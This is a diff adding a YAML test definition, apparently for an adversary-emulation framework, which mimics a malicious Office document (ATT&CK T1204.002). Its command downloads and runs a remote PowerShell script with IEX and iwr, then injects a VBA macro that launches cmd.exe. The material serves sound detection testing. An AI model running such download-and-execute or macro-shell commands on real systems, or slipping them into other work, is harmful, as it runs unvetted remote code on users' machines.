@@ -1,0 +1,21 @@
+- description: 'This Test uses a VBA macro to execute cmd with flags observed in recent
+    maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.
+
+    Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1)
+    to load and execute VBA code into Excel or Word documents.
+
+    '
+  id: 1cee9a5e90175bc06c9839edf65c62c8
+  name: Maldoc choice flags command execution
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1");
+          $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)";
+          Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
+        payloads: []
+  tactic: execution
+  technique:
+    attack_id: T1204.002
+    name: 'User Execution: Malicious File'
